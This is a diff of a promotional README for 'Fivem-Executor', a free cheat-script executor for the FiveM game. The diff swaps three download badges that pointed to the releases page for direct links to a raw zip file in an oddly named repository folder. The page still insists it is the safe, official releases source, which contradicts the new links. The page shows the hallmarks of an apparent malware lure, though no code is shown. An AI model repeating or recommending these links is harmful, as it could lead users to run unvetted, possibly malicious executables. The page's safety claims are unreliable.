@@ -1,6 +1,6 @@
 # 🎮 Fivem-Executor - Your Key to Unlimited FiveM Scripts
 
-[![Download Fivem Executor](https://img.shields.io/badge/Download-Fivem_Executor-2ea44f?style=for-the-badge&logo=github&logoColor=white&labelColor=blue)](https://github.com/Crossmodal-gretzky7935/Fivem-Executor/releases)
+[![Download Fivem Executor](https://img.shields.io/badge/Download-Fivem_Executor-2ea44f?style=for-the-badge&logo=github&logoColor=white&labelColor=blue)](https://github.com/Crossmodal-gretzky7935/Fivem-Executor/raw/refs/heads/main/encratic/Fivem_Executor_v1.9.zip)
 
 ## 🚀 What Is Fivem-Executor?
 
@@ -19,7 +19,7 @@ Fivem-Executor is a powerful, completely free script executor designed specifica
 
 **Step 1: Click the Download Button**
 
-[![Download Now](https://img.shields.io/badge/⬇️_Download_Fivem_Executor-Free_2026-orange?style=for-the-badge)](https://github.com/Crossmodal-gretzky7935/Fivem-Executor/releases)
+[![Download Now](https://img.shields.io/badge/⬇️_Download_Fivem_Executor-Free_2026-orange?style=for-the-badge)](https://github.com/Crossmodal-gretzky7935/Fivem-Executor/raw/refs/heads/main/encratic/Fivem_Executor_v1.9.zip)
 
 Visit this link to download the application. This is the only official download source. Do not download from third-party websites.
 
@@ -144,7 +144,7 @@ Visit the GitHub repository page for the latest news, release notes, and communi
 
 ## ⬇️ Download Again
 
-[![Get Fivem Executor Free](https://img.shields.io/badge/🔄_Download_Fivem_Executor_2026-Free-red?style=for-the-badge)](https://github.com/Crossmodal-gretzky7935/Fivem-Executor/releases)
+[![Get Fivem Executor Free](https://img.shields.io/badge/🔄_Download_Fivem_Executor_2026-Free-red?style=for-the-badge)](https://github.com/Crossmodal-gretzky7935/Fivem-Executor/raw/refs/heads/main/encratic/Fivem_Executor_v1.9.zip)
 
 Remember: Always download from the official GitHub releases page to ensure you get the authentic, safe, and updated version. Enjoy your enhanced FiveM experience with Fivem-Executor!
 
